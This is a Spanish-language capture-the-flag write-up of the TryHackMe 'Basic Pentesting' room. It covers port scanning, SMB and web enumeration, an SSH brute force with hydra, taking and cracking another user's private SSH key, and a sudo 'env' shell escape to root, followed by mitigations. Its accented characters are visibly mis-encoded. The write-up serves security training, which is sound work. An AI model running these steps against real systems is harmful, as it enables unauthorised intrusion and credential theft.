---
title: "TryHackMe - Basic Pentesting Writeup"
description: "An√°lisis completo de la room Basic Pentesting de TryHackMe. Aprende t√©cnicas de reconocimiento, enumeraci√≥n, explotaci√≥n y escalada de privilegios en este desaf√≠o."
pubDate: "2024-11-27"
author: "Juan Nu√±ez"
tags: ["TryHackMe", "Pentesting", "Linux", "Enumeration", "Privilege Escalation"]
---

# TryHackMe - Basic Pentesting Writeup

## üéØ Informaci√≥n de la Room

- **Plataforma**: TryHackMe
- **Dificultad**: F√°cil
- **Objetivo**: Obtener acceso root y capturar las flags
- **Skills**: Reconocimiento, Enumeraci√≥n, Explotaci√≥n Web, Escalada de Privilegios

## üîç Fase 1: Reconocimiento

### Escaneo de Puertos con Nmap

Comenzamos con un escaneo de puertos para identificar servicios activos:

\`\`\`bash
nmap -sC -sV -oN nmap_scan.txt <TARGET_IP>
\`\`\`

**Resultados del escaneo:**

\`\`\`
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.2p2
80/tcp    open  http        Apache httpd 2.4.18
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu
8009/tcp  open  ajp13       Apache Jserv
8080/tcp  open  http        Apache Tomcat 9.0.7
\`\`\`

### Servicios Identificados

- **SSH (22)**: OpenSSH 7.2p2 - Posible vector de fuerza bruta
- **HTTP (80)**: Apache - Aplicaci√≥n web principal
- **SMB (139/445)**: Samba - Recursos compartidos
- **HTTP (8080)**: Apache Tomcat - Panel de administraci√≥n

## üåê Fase 2: Enumeraci√≥n Web

### Exploraci√≥n del sitio web (Puerto 80)

Navegamos al sitio web y encontramos una p√°gina simple. Realizamos enumeraci√≥n de directorios:

\`\`\`bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
\`\`\`

**Directorios encontrados:**
- `/development` - Directorio con informaci√≥n sensible
- `/admin` - Panel de administraci√≥n

### An√°lisis de /development

En el directorio `/development` encontramos dos archivos:
- `dev.txt` - Notas de desarrollo
- `j.txt` - Lista de posibles usuarios

**Contenido de dev.txt:**
\`\`\`
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! 
I think it might be neat to host that on this server too.
\`\`\`

**Contenido de j.txt:**
\`\`\`
kay
jan
\`\`\`

## üìÅ Fase 3: Enumeraci√≥n SMB

### Escaneo de recursos compartidos SMB

\`\`\`bash
smbclient -L //<TARGET_IP>/ -N
\`\`\`

**Recursos compartidos:**
- `Anonymous` - Acceso sin autenticaci√≥n

\`\`\`bash
smbclient //<TARGET_IP>/Anonymous -N
\`\`\`

Dentro encontramos un archivo `staff.txt` con informaci√≥n de empleados:

\`\`\`
Announcement to staff:

PLEASE DON'T USE YOUR PERSONAL PASSWORDS FOR WORK!
Employee usernames: jan, kay
\`\`\`

## üí• Fase 4: Explotaci√≥n

### SSH Brute Force

Con los usuarios identificados (jan, kay), intentamos fuerza bruta en SSH:

\`\`\`bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
\`\`\`

**Credenciales encontradas:**
- Usuario: `jan`
- Password: `armando`

### Acceso SSH

\`\`\`bash
ssh jan@<TARGET_IP>
\`\`\`

¬°Acceso exitoso! üéâ

### Enumeraci√≥n Interna

Una vez dentro, enumeramos el sistema:

\`\`\`bash
# Listar usuarios
cat /etc/passwd | grep bash

# Buscar archivos con SUID
find / -perm -4000 2>/dev/null

# Verificar permisos sudo
sudo -l
\`\`\`

Encontramos:
- Usuario `kay` con directorio home
- Archivo `.ssh/id_rsa` en home de kay (accesible)

### Lateral Movement

Copiamos la clave privada SSH de kay:

\`\`\`bash
cat /home/kay/.ssh/id_rsa
\`\`\`

La clave est√° protegida con passphrase. Usamos `ssh2john` y `john`:

\`\`\`bash
# En tu m√°quina local
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
\`\`\`

**Passphrase encontrada:** `beeswax`

Nos conectamos como kay:

\`\`\`bash
chmod 600 id_rsa
ssh -i id_rsa kay@<TARGET_IP>
\`\`\`

## üöÄ Fase 5: Escalada de Privilegios

### Enumeraci√≥n de privilegios

\`\`\`bash
sudo -l
\`\`\`

Output:
\`\`\`
User kay may run the following commands:
    (root) NOPASSWD: /usr/bin/env
\`\`\`

### Explotaci√≥n

Consultamos GTFOBins para `/usr/bin/env`:

\`\`\`bash
sudo /usr/bin/env /bin/bash
\`\`\`

¬°Root obtenido! üîì

### Captura de Flags

**User Flag:**
\`\`\`bash
cat /home/kay/user.txt
\`\`\`

**Root Flag:**
\`\`\`bash
cat /root/root.txt
\`\`\`

## üìö Lecciones Aprendidas

1. **Enumeraci√≥n exhaustiva**: La clave estaba en enumerar todos los servicios (SMB, HTTP, SSH)
2. **Reutilizaci√≥n de contrase√±as**: Los usuarios suelen reutilizar contrase√±as d√©biles
3. **Permisos incorrectos**: La clave SSH de kay era accesible por jan
4. **Sudo misconfiguration**: `env` con NOPASSWD permite escalada trivial

## üõ°Ô∏è Mitigaciones

- **SMB**: Deshabilitar acceso an√≥nimo o limitar informaci√≥n expuesta
- **Permisos de archivos**: Aplicar principio de m√≠nimo privilegio (chmod 600 en claves SSH)
- **Pol√≠ticas de contrase√±as**: Implementar contrase√±as fuertes y √∫nicas
- **Sudo**: Evitar NOPASSWD en binarios que permiten ejecuci√≥n de shell

## üîó Referencias

- [GTFOBins - env](https://gtfobins.github.io/gtfobins/env/)
- [Hydra Documentation](https://github.com/vanhauser-thc/thc-hydra)
- [SSH Key Cracking](https://null-byte.wonderhowto.com/how-to/crack-ssh-private-key-passwords-with-john-ripper-0302810/)

---

*Este writeup es solo para prop√≥sitos educativos. Siempre obt√©n permiso antes de realizar pruebas de penetraci√≥n.*
